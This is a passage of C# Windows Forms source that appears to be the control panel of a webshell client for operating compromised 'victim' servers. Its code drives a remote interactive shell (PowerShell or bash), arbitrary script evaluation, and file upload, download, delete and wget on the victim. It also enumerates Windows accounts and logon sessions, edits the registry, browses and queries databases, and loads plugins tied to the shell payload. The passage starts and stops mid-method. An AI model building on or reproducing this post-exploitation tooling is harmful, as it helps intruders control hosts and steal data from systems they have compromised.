                listView.FullRowSelect = true;
                listView.GridLines = true;

                var templateRow = data.FirstOrDefault(r => r?.Data != null && r.Data.Count > 0);

                if (templateRow == null)
                {
                    listView.EndUpdate();
                    return;
                }

                var columnList = templateRow.Data.Keys.ToList();

                foreach (var col in columnList)
                    listView.Columns.Add(col);

                foreach (var row in data)
                {
                    if (row?.Data == null || row.Data.Count == 0)
                        continue;

                    var item = new ListViewItem();
                    bool hasValue = false;

                    for (int i = 0; i < columnList.Count; i++)
                    {
                        row.Data.TryGetValue(columnList[i], out string? value);
                        value ??= "";

                        if (value != "") hasValue = true;

                        if (i == 0)
                            item.Text = value;
                        else
                            item.SubItems.Add(value);
                    }

                    if (hasValue)
                        listView.Items.Add(item);
                }

                listView.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);

                listView.EndUpdate();
            }

            try
            {
                toolStripStatusLabel5.Text = "Loading...";

                listView5.View = View.Details;
                listView6.View = View.Details;
                listView7.View = View.Details;
                listView8.View = View.Details;
                listView9.View = View.Details;
                listView10.View = View.Details;

                listView5.Columns.Clear();
                listView6.Columns.Clear();
                listView7.Columns.Clear();
                listView8.Columns.Clear();
                listView9.Columns.Clear();
                listView10.Columns.Clear();

                listView5.Items.Clear();
                listView6.Items.Clear();
                listView7.Items.Clear();
                listView8.Items.Clear();
                listView9.Items.Clear();
                listView10.Items.Clear();

                var result = await m_winUser.fnGetData();

                fnLoadWmiToListView(listView5, result.UserAccounts);
                fnLoadWmiToListView(listView6, result.UserProfiles);
                fnLoadWmiToListView(listView7, result.Groups);
                fnLoadWmiToListView(listView8, result.GroupUsers);
                fnLoadWmiToListView(listView9, result.LoggedOn);
                fnLoadWmiToListView(listView10, result.LogonSession);

                toolStripStatusLabel5.Text = "Action successfully.";
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnWinUserInit", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        #endregion
        #region Registry

        private async Task fnRegInit()
        {
            listView3.Items.Clear();
            treeView5.Nodes.Clear();
            textBox7.Clear();

            listView3.GridLines = true;

            var dicHives = await m_winReg.fnHives();

            TreeNode nodePC = new TreeNode("Computer");
            nodePC.ImageKey = "computer";
            nodePC.SelectedImageKey = nodePC.ImageKey;

            treeView5.Nodes.Add(nodePC);

            foreach (string szKey in dicHives.Keys)
            {
                TreeNode node = new TreeNode(szKey);
                node.ImageKey = "key";
                node.SelectedImageKey = node.ImageKey;

                nodePC.Nodes.Add(node);
            }

            nodePC.Expand();
        }

        private void fnRegRefresh()
        {
            if (string.IsNullOrEmpty(m_winReg.m_szCurrentPath))
                return;

            string szFullPath = "Computer\\" + m_winReg.m_szCurrentPath;
            TreeNode node = fnFindNodeWithFullPath(treeView5.Nodes, szFullPath);
            if (node == null)
                return;

            listView3.Items.Clear();
            treeView5.SelectedNode = null;
            treeView5.SelectedNode = node;
        }


        private void fnRegSetValue(string szName, string szType, string szValue)
        {
            frmRegEditString f = new frmRegEditString(m_winReg, m_winReg.m_szCurrentPath, szName, szType, szValue);
            f.Text = "Edit Value";

            f.ShowDialog();

            fnRegRefresh();
        }
        private void fnRegSetValue(string szName, string szType, ulong nValue)
        {
            frmRegEditWord f = new frmRegEditWord(m_winReg, m_winReg.m_szCurrentPath, szName, szType, nValue);
            f.Text = "Edit Value";

            f.ShowDialog();

            fnRegRefresh();
        }
        private void fnRegSetValue(string szName, string szType, byte[] abValue)
        {
            frmRegEditBytes f = new frmRegEditBytes(m_winReg, m_winReg.m_szCurrentPath, szName, szType, abValue);
            f.Text = "Edit Bytes";

            f.ShowDialog();

            fnRegRefresh();
        }
        private void fnRegSetValue(string szName, string szType, string[] asData)
        {
            frmRegEditMultiString f = new frmRegEditMultiString(m_winReg, m_winReg.m_szCurrentPath, szName, szType, asData);
            f.Text = "Edit Value";

            f.ShowDialog();

            fnRegRefresh();
        }

        #endregion

        #endregion

        async void fnClose()
        {
            timerShell.Stop();

            //await m_web.DisposeAsync();
        }

        async void fnSetup()
        {
            if (!await fnbValidator())
            {
                MessageBox.Show("Validation failed", "fnbValidator()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            // Clear status labels
            toolStripStatusLabel1.Text = string.Empty;
            toolStripStatusLabel2.Text = string.Empty;
            toolStripStatusLabel5.Text = string.Empty;
            toolStripStatusLabel6.Text = string.Empty;
            toolStripStatusLabel7.Text = string.Empty;
            toolStripStatusLabel8.Text = "Loading...";

            textBox8.Text = m_victim.ShellURL;

            treeView3.ImageList = fileImageList;
            m_fileMgr.m_ExtIcon.Images.Add(fileImageList.Images["folder"]);
            m_fileMgr.m_ExtIcon.Images.SetKeyName(m_fileMgr.m_ExtIcon.Images.Count - 1, "folder");
            listView2.SmallImageList = m_fileMgr.m_ExtIcon;

            tabPage1.Controls.Add(m_ctrlInfoBrowser);
            m_ctrlInfoBrowser.Dock = DockStyle.Fill;
            m_ctrlInfoBrowser.BringToFront();

            splitContainer4.Panel1.Controls.Add(m_ctrlEvalBrowser);
            tabControl5.TabPages[0].Controls.Add(m_ctrlEvalEditor);
            tabControl5.TabPages[1].Controls.Add(m_ctrlPostEditor);
            m_ctrlEvalBrowser.Dock = DockStyle.Fill;
            m_ctrlEvalEditor.Dock = DockStyle.Fill;
            m_ctrlPostEditor.Dock = DockStyle.Fill;
            m_ctrlEvalBrowser.BringToFront();
            m_ctrlEvalEditor.BringToFront();
            m_ctrlPostEditor.BringToFront();

            toolStripStatusLabel3.Text = string.Empty;

            var fileInit = await m_fileMgr.fnszInit();

            //Information
            m_ctrlInfoBrowser.DocumentText = await fnszGetInfo();

            //FileMgr
            textBox1.Text = fileInit.szCurrentDir;
            m_web.m_victim.m_bUnixLike = fileInit.bUnixLike;
            foreach (string szName in fileInit.lsLogicalDrive)
            {
                TreeNode node = new TreeNode(szName);
                node.ImageKey = "harddrive";
                treeView3.Nodes.Add(node);
            }

            fnFileAddPathToTreeView(fileInit.szCurrentDir);
            treeView3.ExpandAll();

            TreeNode cdNode = fnFindNodeWithFullPath(treeView3.Nodes, fileInit.szCurrentDir);
            treeView3.SelectedNode = cdNode;

            //Shell

            richTextBox2.Font = new Font("Consolas", Font.Size);
            textBox3.Text = "whoami";
            textBox4.Text = "powershell.exe";
            textBox6.Text = "/bin/bash";

            m_rShell.m_szCurrentDir = fileInit.szCurrentDir;
            fnShellInit();

            tabControl8.Appearance = TabAppearance.FlatButtons;
            tabControl8.ItemSize = new Size(0, 1);
            tabControl8.SizeMode = TabSizeMode.Fixed;

            string szBaseDir = AppDomain.CurrentDomain.BaseDirectory;
            string szRelativePath = Path.Combine("Tools", "xterm", "terminal.html");
            string szAbsolutePath = Path.Combine(szBaseDir, szRelativePath);

            await webViewShell.EnsureCoreWebView2Async(null);
            webViewShell.CoreWebView2.Navigate(new Uri(szAbsolutePath).AbsoluteUri);
            webViewShell.CoreWebView2.WebMessageReceived += async (s, e) =>
            {
                string rawMsg = e.TryGetWebMessageAsString();

                var parts = rawMsg.Split('|');
                if (parts.Length < 2 || parts[0] != "xterm")
                    return;

                string action = parts[1];

                if (action == "input")
                {
                    string b64Data = parts[2];
                    await m_rShell.fnPipeWrite(b64Data);
                }
                else if (action == "resize")
                {
                    string cols = parts[2];
                    string rows = parts[3];
                    await m_rShell.fnPipeResize(cols, rows);
                }
            };
            webViewShell.SizeChanged += async (s, e) =>
            {
                if (webViewShell.CoreWebView2 != null)
                    await webViewShell.CoreWebView2.ExecuteScriptAsync("fitTerminal();");
            };

            await webViewLinuxShell.EnsureCoreWebView2Async(null);
            webViewLinuxShell.CoreWebView2.Navigate(new Uri(szAbsolutePath).AbsolutePath);
            webViewLinuxShell.CoreWebView2.WebMessageReceived += async (s, e) =>
            {
                string rawMsg = e.TryGetWebMessageAsString();

                var parts = rawMsg.Split('|');
                if (parts.Length < 2 || parts[0] != "xterm")
                    return;

                string action = parts[1];

                if (action == "input")
                {
                    string b64Data = parts[2];
                    await m_rShell.fnPipeWrite(b64Data);
                }
                else if (action == "resize")
                {
                    string cols = parts[2];
                    string rows = parts[3];
                    await m_rShell.fnPipeResize(cols, rows);
                }
            };
            webViewLinuxShell.SizeChanged += async (s, e) =>
            {
                await webViewLinuxShell.CoreWebView2.ExecuteScriptAsync("fitTerminal();");
            };

            tabControl8.SelectedIndex = m_victim.m_bUnixLike ? 1 : 0;

            //Database
            fnDbInit();

            tabControl4.AllowDrop = true;
            tabControl4.Padding = new Point(30, 3);
            tabControl4.DrawMode = TabDrawMode.OwnerDrawFixed;
            tabControl4.DrawItem += (s, e) =>
            {
                if (e.Index < 0 || e.Index >= tabControl4.TabPages.Count)
                    return;

                TabPage page = tabControl4.TabPages[e.Index];
                Rectangle rect = tabControl4.GetTabRect(e.Index);

                // text
                TextRenderer.DrawText(
                    e.Graphics,
                    page.Text,
                    e.Font,
                    rect,
                    Color.Black);

                // X button
                Rectangle closeRect = fnGetCloseRect(e.Index);

                ControlPaint.DrawCaptionButton(
                    e.Graphics,
                    closeRect,
                    CaptionButton.Close,
                    ButtonState.Flat);
            };
            tabControl4.MouseDown += (s, e) =>
            {
                int nIdx = fnGetTabIndexAt(e.Location);
                if (nIdx == -1)
                    return;

                if (fnGetCloseRect(nIdx).Contains(e.Location))
                {
                    tabControl4.TabPages.RemoveAt(nIdx);
                    return;
                }

                if (e.Button != MouseButtons.Left)
                    return;

                draggedTab = tabControl4.TabPages[nIdx];

                tabControl4.DoDragDrop(draggedTab, DragDropEffects.Move);
            };
            tabControl4.DragOver += (s, e) =>
            {
                e.Effect = DragDropEffects.Move;
            };
            tabControl4.DragDrop += (s, e) =>
            {
                Point p = tabControl4.PointToClient(new Point(e.X, e.Y));
                int nIdx = fnGetTabIndexAt(p);

                if (nIdx < 0 || draggedTab == null)
                    return;

                int oldIdx = tabControl4.TabPages.IndexOf(draggedTab);

                if (oldIdx == -1 || oldIdx == nIdx)
                    return;

                tabControl4.TabPages.Remove(draggedTab);

                if (nIdx > oldIdx)
                    nIdx--;

                nIdx = Math.Max(0, Math.Min(nIdx, tabControl4.TabPages.Count));

                tabControl4.TabPages.Insert(nIdx, draggedTab);

                tabControl4.SelectedTab = draggedTab;

                draggedTab = null;
            };
            tabControl4.DragLeave += (s, e) =>
            {
                draggedTab = null;
            };

            if (m_victim.m_bUnixLike)
            {
                // Linux

                TabPage page = tabControl1.TabPages[6];
                tabControl1.TabPages.Remove(page);
            }
            else
            {
                // Windows

                TabPage page = tabControl1.TabPages[5];
                tabControl1.TabPages.Remove(page);

                await fnWinUserInit();
                await fnRegInit();
            }

            // Plugins

            /*
              
            var plugins = m_plugin.fnGetPlugins();
            foreach (var plugin in plugins)
            {
                TreeNode node = new TreeNode(plugin.szPluginName);
                node.Tag = plugin;

                treeView1.Nodes.Add(node);
            }

            */

            string szEnv = Path.Combine(Enum.GetName(typeof(enLanguage), m_victim.ShellLanguage), m_victim.ShellMethod, Enum.GetName(typeof(enPayloadType), m_victim.ShellPayloadType)).Replace("\\", "/");

            await webViewPlugin.EnsureCoreWebView2Async(null);
            webViewPlugin.CoreWebView2.AddHostObjectToScript("nativeBridge", new clsfnPlugin.clsBridge(m_web, szEnv));

            string szHtmlPath = Path.Combine(m_plugin.m_szPluginsDir, "index.html");
            webViewPlugin.CoreWebView2.Navigate(szHtmlPath);

            foreach (string szDir in Directory.GetDirectories(Path.Combine(Application.StartupPath, "Plugins")))
            {
                TreeNode node = new TreeNode(Path.GetFileName(szDir));
                treeView1.Nodes.Add(node);
            }

            toolStripStatusLabel8.Text = $"Module[{treeView1.Nodes.Count}]";

            // Note
            try
            {
                string szFilePath = Path.Combine(m_victim.m_szPortfolio, "note.txt");
                string szContent = Path.Exists(szFilePath) ? File.ReadAllText(szFilePath) : string.Empty;

                textEditorControl1.Text = szContent;

                textEditorControl1.TextChanged += (s, e) =>
                {
                    toolStripStatusLabel7.Text = "Have not saved (Please save it before you close the control panel)";
                };
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void frmControlPanel_Load(object sender, EventArgs e)
        {
            try
            {
                fnSetup();
            }
            catch (InvalidOperationException)
            {

            }
        }

        private void treeView3_AfterSelect(object sender, TreeViewEventArgs e)
        {
            toolStripStatusLabel2.Text = "Loading...";

            TreeNode node = treeView3.SelectedNode;
            node.SelectedImageKey = node.ImageKey;
            string szDir = node.Parent == null && !m_victim.m_bUnixLike ? node.FullPath + "\\" : node.FullPath;
            fnFileScandir(szDir);
        }

        //File.Parent
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, m_fileMgr.m_szCurrentPath);
            if (node != null && node.Parent != null)
                treeView3.SelectedNode = node.Parent;
        }
        //File.Home
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, m_fileMgr.m_szHomePath);
            if (node != null)
                treeView3.SelectedNode = node;
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {

        }
        //File.Copy
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            var lsEntry = listView2.SelectedItems.Cast<ListViewItem>().Select(x => fnFileGetItemTag(x)).ToList();
            var lsDir = lsEntry.Where(x => x.bIsDirectory).ToList();
            var lsFile = lsEntry.Where(x => !x.bIsDirectory).ToList();

            m_fileMgr.m_dirClipboard = lsDir;
            m_fileMgr.m_fileClipboard = lsFile;
            m_fileMgr.m_moveClipboard = false;
        }
        //File.Cut
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            var lsEntry = listView2.SelectedItems.Cast<ListViewItem>().Select(x => fnFileGetItemTag(x)).ToList();
            var lsDir = lsEntry.Where(x => x.bIsDirectory).ToList();
            var lsFile = lsEntry.Where(x => !x.bIsDirectory).ToList();

            m_fileMgr.m_dirClipboard = lsDir;
            m_fileMgr.m_fileClipboard = lsFile;
            m_fileMgr.m_moveClipboard = true;
        }
        //File.Paste
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            frmFileCopyMoveProgress f = new frmFileCopyMoveProgress(m_fileMgr, m_fileMgr.m_szCurrentPath);
            f.ShowDialog();

            fnFileMgrRefresh();
        }
        //File.Image.ShowAll
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            fnFileDisplayAllImage();
        }
        //File.Image.ShowSelected
        private async void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            List<string> lsFilePath = new List<string>();

            foreach (ListViewItem item in listView2.SelectedItems)
            {
                var entry = fnFileGetItemTag(item);
                if (!entry.bIsDirectory && fnbIsImageFile(Path.GetExtension(entry.szEntryPath)))
                    lsFilePath.Add(entry.szEntryPath);
            }

            await fnFileDisplayImage(lsFilePath);
        }

        private async void toolStripButton3_Click(object sender, EventArgs e)
        {
            m_ctrlInfoBrowser.DocumentText = await fnszGetInfo();
        }

        private void listView2_DoubleClick(object sender, EventArgs e)
        {
            List<ListViewItem> lItem = listView2.SelectedItems.Cast<ListViewItem>().ToList();
            if (lItem.Count == 0)
                return;

            var entry = fnFileGetItemTag(lItem[0]);
            if (entry.bIsDirectory)
            {
                TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, entry.szEntryPath);
                if (node != null)
                    treeView3.SelectedNode = node;
            }
            else
            {
                fnFileRead(entry.szEntryPath);
            }
        }

        private void listView2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                if (e.KeyCode == Keys.A)
                {
                    listView2.Items.Cast<ListViewItem>().Select(x => x.Selected = true);
                }
            }
            else
            {
                if (e.KeyCode == Keys.F5)
                {
                    fnFileScandir(m_fileMgr.m_szCurrentPath);
                }
                else if (e.KeyCode == Keys.Enter)
                {
                    foreach (ListViewItem item in listView2.SelectedItems)
                    {
                        var entry = fnFileGetItemTag(item);
                        if (entry.bIsDirectory)
                            treeView3.SelectedNode = fnFindNodeWithFullPath(treeView3.Nodes, entry.szEntryPath);
                        else
                            fnFileRead(entry.szEntryPath);
                    }
                }
            }
        }



        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                fnFileDirExists(textBox1.Text);
            }
        }

        //File.NewFolder
        private async void toolStripMenuItem15_Click(object sender, EventArgs e)
        {
            string szDirName = Interaction.InputBox("Dir Name: ", "Create New Directory", $"Folder_{DateTime.Now.ToString("yyyyMMddHHmmssfff")}");
            if (string.IsNullOrEmpty(szDirName))
            {
                MessageBox.Show("Directory name cannot be null or empty.", "Empty", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            szDirName = Path.Combine(m_fileMgr.m_szCurrentPath, szDirName).Replace("\\", "/").Replace("//", "/");

            if (await m_fileMgr.fnbNewFolder(szDirName))
            {
                MessageBox.Show("Created the directory successfully!", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                fnFileMgrRefresh();
            }
            else
            {
                MessageBox.Show("Failed to create a new directory.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        //File.NewFile
        private void toolStripMenuItem16_Click(object sender, EventArgs e)
        {
            fnFileNewFile();
        }

        //File.NewFile
        private void toolStripMenuItem13_Click(object sender, EventArgs e)
        {
            fnFileNewFile();
        }

        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {

        }

        //File.NewFolder
        private async void toolStripMenuItem12_Click(object sender, EventArgs e)
        {
            string szDirName = Interaction.InputBox("Dir Name: ", "Create New Directory", $"Folder_{DateTime.Now.ToString("yyyyMMddHHmmssfff")}");
            if (string.IsNullOrEmpty(szDirName))
            {
                MessageBox.Show("Directory name cannot be null or empty.", "Empty", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            szDirName = Path.Combine(m_fileMgr.m_szCurrentPath, szDirName).Replace("\\", "/").Replace("//", "/");

            if (await m_fileMgr.fnbNewFolder(szDirName))
            {
                MessageBox.Show("Created the directory successfully!", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                fnFileMgrRefresh();
            }
            else
            {
                MessageBox.Show("Failed to create a new directory.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            frmDbEdit f = new frmDbEdit(m_dbMgr, this);

            f.ShowDialog();
        }

        private void treeView2_AfterSelect(object sender, TreeViewEventArgs e)
        {

        }

        //Upload
        private async void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Multiselect = true;

            if (ofd.ShowDialog() == DialogResult.OK)
            {
                List<string> lsSrcFiles = ofd.FileNames.ToList();

                tabControl6.SelectedIndex = 1;

                await fnFileUpload(lsSrcFiles, 3, 1024 * 10, fnFileMgrRefresh);
            }
        }

        //Download
        private async void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            List<clsfnFileMgr.stEntry> lsEntry = listView2.SelectedItems.Cast<ListViewItem>().Select(x => fnFileGetItemTag(x)).ToList();
            var lsDir = lsEntry.Where(x => x.bIsDirectory).Select(x => x.szEntryPath).ToList();
            var lsFile = lsEntry.Where(x => !x.bIsDirectory).Select(x => (x.szEntryPath, x.nSize)).ToList();

            tabControl6.SelectedIndex = 1;

            var result = await fnFileDownload(lsFile);
            var dicState = result.dicState;
            var szSaveDirPath = result.szSaveDirPath;

            if (dicState.Values.Any(x => x == true))
            {
                DialogResult dr = MessageBox.Show(
                    "Downloading task is completed, do you want to open the save folder?",
                    "Finished",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question
                );

                if (dr == DialogResult.Yes)
                {
                    Process.Start("explorer.exe", szSaveDirPath);
                }
            }
            else
            {
                MessageBox.Show("Failed", "Download File", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        //WGET
        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {
            frmWGET f = new frmWGET(m_fileMgr, this, m_fileMgr.m_szCurrentPath);
            f.Show();
        }

        //Parent
        private void toolStripButton5_Click(object sender, EventArgs e)
        {
            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, m_fileMgr.m_szCurrentPath);
            if (node == null || node.Parent == null)
                return;

            treeView3.SelectedNode = node.Parent;
        }

        //Home
        private void toolStripButton6_Click(object sender, EventArgs e)
        {
            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, m_fileMgr.m_szHomePath);
            if (node == null)
                return;

            treeView3.SelectedNode = node;
        }

        //Delete
        private async void toolStripMenuItem17_Click(object sender, EventArgs e)
        {
            List<clsfnFileMgr.stEntry> lsEntry = listView2.SelectedItems.Cast<ListViewItem>().Select(x => fnFileGetItemTag(x)).ToList();
            if (lsEntry.Count == 0)
                return;

            if (DialogResult.Yes != MessageBox.Show($"Are you sure to delete {lsEntry.Count} file{(lsEntry.Count > 1 ? "s" : string.Empty)}?", "Wait!", MessageBoxButtons.YesNo, MessageBoxIcon.Question))
                return;

            bool bFlag = true;
            foreach (var entry in lsEntry)
            {
                if (!await fnbFileDelete(entry))
                {
                    bFlag = false;
                    MessageBox.Show("Failed to delete: " + entry.szEntryPath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }

            if (bFlag)
            {
                MessageBox.Show($"Delete {lsEntry.Count} file{(lsEntry.Count > 1 ? "s" : string.Empty)} successfully.", "OK!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                fnFileMgrRefresh();
            }
        }

        //Find
        private async void toolStripButton4_Click_1(object sender, EventArgs e)
        {
            listView1.Items.Clear();
            listView1.SmallImageList = m_fileMgr.m_ExtIcon;

            string szPattern = textBox10.Text;
            string[] aDir = textBox9.Text.Split(Environment.NewLine);

            try
            {
                var result = await m_fileMgr.fnFileSearch(szPattern, aDir);
                if (result == null)
                {
                    MessageBox.Show("JSON deserialization is failed!", "Find", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                if (!result.Status)
                {
                    MessageBox.Show(result.Msg, "Find", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                List<clsfnFileMgr.stEntry> entries = new List<clsfnFileMgr.stEntry>();

                foreach (var item in result.Results)
                {
                    entries.Add(new clsfnFileMgr.stEntry()
                    {
                        szEntryPath = item.Path,
                        bIsDirectory = string.Equals(item.Type, "Directory"),
                        szPriviledge = item.Permission,
                        dtCreationDate = DateTime.Parse(item.Created),
                        dtLastModifiedDate = DateTime.Parse(item.LastModified),
                        dtLastAccessedDate = DateTime.Parse(item.LastAccessed)
                    });
                }

                var dirs = entries.Where(x => x.bIsDirectory).ToList();
                var files = entries.Where(x => !x.bIsDirectory).ToList();

                entries.Clear();
                entries = dirs.Concat(files).ToList();

                foreach (var entry in entries)
                {
                    ListViewItem item = new ListViewItem(entry.szEntryName);

                    string szExtension = entry.szEntryName.Split('.').Last();
                    if (!entry.bIsDirectory)
                        m_fileMgr.fnGetExtensionIcon(szExtension);

                    item.ImageKey = entry.bIsDirectory ? "folder" : szExtension;

                    item.Tag = entry;

                    item.SubItems.Add(entry.szEntryPath);
                    item.SubItems.Add(entry.szPriviledge);
                    item.SubItems.Add(entry.dtCreationDate.ToString("F"));
                    item.SubItems.Add(entry.dtLastModifiedDate.ToString("F"));
                    item.SubItems.Add(entry.dtLastAccessedDate.ToString("F"));

                    listView1.Items.Add(item);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        // Eval script
        private async void toolStripButton7_Click(object sender, EventArgs e)
        {
            toolStripStatusLabel3.Text = "Loading...";

            string szCode = m_ctrlEvalEditor.Text;
            string szResp = await m_runScript.fnszRunScript(szCode);
            m_ctrlEvalBrowser.DocumentText = szResp;

            toolStripStatusLabel3.Text = "Run code is executed.";
        }

        // Database.Add
        private void toolStripMenuItem18_Click(object sender, EventArgs e)
        {
            frmDbEdit f = new frmDbEdit(m_dbMgr, this);
            f.ShowDialog();
        }

        // Database.Reload
        private void toolStripMenuItem19_Click(object sender, EventArgs e)
        {

        }

        private async void treeView2_DoubleClick(object sender, EventArgs e)
        {
            TreeNode node = treeView2.SelectedNode;
            if (node == null)
                return;

            if (node.Parent == null)
            {
                //Show databases

                toolStripLabel2.Text = "Loading...";

                var config = m_dbMgr.m_stDbConfig[node.Text];
                var result = await m_dbMgr.fnSqlQueryEx(config, m_dbMgr.m_dicShowDatabaseSQL[config.enDbType]);

                if (!result.bSuccess)
                {
                    MessageBox.Show(result.szErrorMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    toolStripLabel2.Text = "Action failed!";

                    return;
                }

                List<string> lsDb = node.Nodes.Cast<TreeNode>().Select(x => x.Text).ToList();

                foreach (DataRow dr in result.dtOutput.Rows)
                {
                    string? szDb = dr[0].ToString();
                    if (string.IsNullOrEmpty(szDb))
                        continue;

                    szDb = szDb.Replace("$(DATABASE)", config.szSource);
                    if (lsDb.Contains(szDb))
                        continue;

                    TreeNode nodeDb = new TreeNode(szDb);
                    nodeDb.ImageKey = "database";
                    nodeDb.SelectedImageKey = nodeDb.ImageKey;

                    node.Nodes.Add(nodeDb);
                }

                node.Expand();

                textBox2.Text = config.szConnString;

                toolStripLabel2.Text = "Action successfully.";
            }
            else if (node.Parent != null && node.Parent.Parent == null)
            {
                // Table -> Show items

                toolStripLabel2.Text = "Loading...";

                string szHost = node.Parent.Text;
                string szDbName = node.Text;

                var config = m_dbMgr.m_stDbConfig[szHost];
                var lsTables = await m_dbMgr.fnDbGetTables(config, szDbName);

                if (lsTables.Count == 0)
                {
                    MessageBox.Show($"Cannot find any table in \"{szDbName}\"", "It is empty!", MessageBoxButtons.OK, MessageBoxIcon.Warning);

                    return;
                }

                fnDbShowTablePage(node, szHost, szDbName, lsTables);

                toolStripLabel2.Text = "Action successfully.";
            }
            else if (node.Parent != null && node.Parent.Parent != null && node.Parent.Parent.Parent == null)
            {
                // Show data

                toolStripLabel2.Text = "Loading...";

                string szHost = node.Parent.Parent.Text;
                string szDbName = node.Parent.Text;
                string szTable = node.Text;

                var config = m_dbMgr.m_stDbConfig[szHost];
                string szQuery = m_dbMgr.fnBuildDataQuery(config.enDbType, szDbName, szTable, 100);
                DataTable dt = await m_dbMgr.fnSqlQuery(config, szQuery);

                fnDbShowData(config, dt, szQuery);

                toolStripLabel2.Text = "Action successfully.";
            }
        }

        // Database.Info
        private void toolStripMenuItem20_Click(object sender, EventArgs e)
        {
            TreeNode? node = treeView2.SelectedNode;
            if (node == null)
                return;

            while (node.Parent != null)
                node = node.Parent;

            var cfg = (clsfnDb.stDbConfig)node.Tag;
            fnDbShowInformation(cfg);
        }

        // Database.SQL
        private void toolStripMenuItem21_Click(object sender, EventArgs e)
        {
            TreeNode? node = treeView2.SelectedNode;
            if (node == null)
                return;

            while (node.Parent != null)
                node = node.Parent;

            var cfg = (clsfnDb.stDbConfig)node.Tag;
            string szDbName = node.Text;

            fnDbShowSqlQuery(cfg, szDbName);
        }

        // Database.Add
        private void toolStripMenuItem22_Click(object sender, EventArgs e)
        {

        }

        // Database.Edit
        private void toolStripMenuItem23_Click(object sender, EventArgs e)
        {
            TreeNode? node = treeView2.SelectedNode;
            if (node == null)
                return;

            while (node.Parent != null)
                node = node.Parent;

            var cfg = (clsfnDb.stDbConfig)node.Tag;

            frmDbEdit f = new frmDbEdit(m_dbMgr, this, cfg);
            f.ShowDialog();
        }

        // Database.Remove (This functionality do NOT remove the remote database, just only the local configuration
        private void toolStripMenuItem24_Click(object sender, EventArgs e)
        {
            TreeNode? nodeSelected = treeView2.SelectedNode;
            if (nodeSelected == null)
                return;

            TreeNode node = nodeSelected;
            while (node.Parent != null)
                node = node.Parent;

            DialogResult dr = MessageBox.Show($"Are you sure to remove \"{node.Text}\"? (Tips: This will only remove the local configuration rather than the remote database).", "Remove?", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dr != DialogResult.Yes)
                return;

            var config = (clsfnDb.stDbConfig)node.Tag;

            if (!m_dbMgr.fnbDbDelete(config))
            {
                MessageBox.Show("Cannot remote database: " + node.Text, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            node.Nodes.Clear();
            treeView2.Nodes.Remove(node);
        }

        // DbTable.Open
        private async void toolStripMenuItem25_Click(object sender, EventArgs e)
        {
            TabPage? page = tabControl4.SelectedTab;
            if (page == null || page.Tag == null)
                return;

            clsDbTablePageControls ctrls = (clsDbTablePageControls)page.Tag;

            if (ctrls.listView.Items.Count == 0)
                return;

            ListViewItem item = ctrls.listView.SelectedItems[0];
            if (item == null)
                return;

            var config = ctrls.m_config;
            string szDbName = ctrls.m_nodeRoot.Text;
            string szTable = item.Text;

            string szQuery = $"SELECT * FROM `{szDbName}`.`{szTable}` LIMIT 100;";
            DataTable dt = await m_dbMgr.fnSqlQuery(config, szQuery);

            fnDbShowData(config, dt, szQuery);
        }

        // DbTable.Dump
        private void toolStripMenuItem28_Click(object sender, EventArgs e)
        {

        }

        // DbTable.New
        private void toolStripMenuItem26_Click(object sender, EventArgs e)
        {

        }

        // DbTable.Delete
        private void toolStripMenuItem27_Click(object sender, EventArgs e)
        {

        }

        private async void button1_Click(object sender, EventArgs e)
        {
            bool bStop = string.Equals(button1.Text, "Stop");

            await m_rShell.fnPipeCreate(textBox4.Text);

            timerShell.Interval = 300;
            timerShell.Start();

            textBox5.Text = "whoami";

            ToolTip tip = new ToolTip();
            tip.IsBalloon = true;
            tip.ToolTipIcon = ToolTipIcon.Info;
            tip.ToolTipTitle = "Please type here!";

            tip.Show("Typing at this textbox is recommanded", textBox5, 5000);
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            bool bStop = string.Equals(button2.Text, "Stop");


